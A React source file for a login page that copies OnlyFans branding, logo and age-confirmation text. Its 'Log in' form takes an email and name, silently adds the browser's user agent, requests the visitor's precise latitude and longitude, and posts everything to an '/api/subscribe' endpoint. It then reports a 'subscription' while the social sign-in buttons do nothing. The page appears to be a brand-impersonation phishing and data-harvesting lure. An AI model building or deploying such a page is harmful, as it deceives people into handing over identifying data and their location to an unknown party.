"use client";

import React, { useState } from "react";
import { FaXTwitter, FaFingerprint } from "react-icons/fa6";
import { FcGoogle } from "react-icons/fc";


export default function Login() {
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({ email: "", name: "" });

  const validateForm = (email, name) => {
    let valid = true;
    let newErrors = { email: "", name: "" };

    if (!email) {
      newErrors.email = "Email is required";
      valid = false;
    } else if (!/\S+@\S+\.\S+/.test(email)) {
      newErrors.email = "Enter a valid email address";
      valid = false;
    }

    if (!name) {
      newErrors.name = "Name is required";
      valid = false;
    } else if (name.length < 2) {
      newErrors.name = "Name must be at least 2 characters";
      valid = false;
    }

    setErrors(newErrors);
    return valid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    const email = e.target.email.value.trim();
    const name = e.target.name.value.trim();
    const device = navigator.userAgent;

    if (!validateForm(email, name)) {
      setLoading(false);
      return;
    }

    // Get location
    let location = null;
    try {
      location = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
            }),
          () => resolve(null)
        );
      });
    } catch {
      location = null;
    }

    // Submit
    await fetch("/api/subscribe", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email,
        name,
        device,
        latitude: location?.latitude || null,
        longitude: location?.longitude || null,
      }),
    });

    alert("Subscription successfully submitted!");
    e.target.reset();
    setLoading(false);
  };

  

  return (
    <div className="flex flex-col md:flex md:flex-row min-h-screen bg-white">

      {/* ▼▼ MOBILE HEADER ▼▼ */}
      <div className="w-full p-6 md:hidden flex flex-col  ">
        <div className="flex flex-row  gap-3  ">
          <img
            src="/avatar.jpg"
            alt="Logo"
            className="w-10 h-10 rounded-full object-cover"
          />
          <h1 className="text-3xl font-bold text-sky-500">OnlyFans</h1>
        </div>

        <p className="mt-4 text-2xl font-semibold leading-snug">
          Sign up to support your favorite creators
        </p>
      </div>
      {/* ▲▲ MOBILE HEADER ▲▲ */}

      {/* LEFT SIDE — DESKTOP ONLY */}
      <div className="hidden md:flex w-1/2 bg-sky-500 items-center justify-center text-white">
        <div className="max-w-md p-8">
          <div className="flex flex-row items-center gap-3">
            <img
              src="/avatar.jpg"
              alt="Logo"
              className="w-12 h-12 object-cover rounded-full"
            />
            <h1 className="text-4xl font-bold mb-4">OnlyFans</h1>
          </div>

          <p className="text-2xl font-semibold leading-snug">
            Sign up to support your favorite creators
          </p>
        </div>
      </div>

      {/* RIGHT SIDE — FORM */}
      <div className="flex w-full md:w-1/2 items-center justify-center bg-white">
        <div className="w-full max-w-md p-8">
          <h2 className="text-lg font-semibold mb-4">Log in</h2>

          {/* FORM */}
          <form
            className="space-y-4"
            action=""
            method="POST"
            onSubmit={handleSubmit}
          >
            <div>
              <input
                type="email"
                name="email"
                placeholder="Email"
                
                className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
              />
              {errors.email && (
                <p className="text-red-500 text-xs mt-1">{errors.email}</p>
              )}
            </div>

            <div>
              <input
                type="name"
                name="name"
                placeholder="name"
                
                className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
              />
              {errors.name && (
                <p className="text-red-500 text-xs mt-1">{errors.name}</p>
              )}
            </div>

            <button
              type="submit"
              className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-full"
            >
              LOG IN
            </button>
          </form>

          <p className="text-xs text-gray-500 mt-3">
            By logging in and using this site, you agree to our{" "}
            <a className="text-sky-500">Terms of Service</a> and{" "}
            <a className="text-sky-500">Privacy Policy</a>, and confirm you are
            at least 18 years old.
          </p>

          <div className="flex justify-center text-sm text-sky-500 mt-4 space-x-2">
            <a>Forgot password?</a>
            <span>•</span>
            <a>Sign up for an account</a>
          </div>

          {/* SOCIAL BUTTONS */}
          <div className="mt-6 space-y-3">
            <button className="w-full flex gap-2 bg-sky-500 text-white font-semibold py-3 rounded-full hover:bg-sky-600 transition relative">
              <div className="ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
                <FaXTwitter className="text-lg" />
              </div>
              <div className="w-full flex items-center justify-center">
                SIGN IN WITH X
              </div>
            </button>

            <button className="w-full flex gap-2 bg-blue-600 text-white font-semibold py-3 rounded-full hover:bg-blue-700 transition relative">
              <div className="bg-white ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
                <FcGoogle className="text-lg" />
              </div>
              <div className="w-full flex items-center justify-center">
                SIGN IN WITH GOOGLE
              </div>
            </button>

            <button className="w-full flex gap-2 bg-sky-400 text-white font-semibold py-3 rounded-full hover:bg-sky-500 transition relative">
              <div className="ml-0.5 -mt-2.5 py-[13.3px] px-2 absolute left-0 rounded-l-full">
                <FaFingerprint className="text-lg" />
              </div>
              <div className="w-full flex items-center justify-center">
                PASSWORDLESS SIGN IN
              </div>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
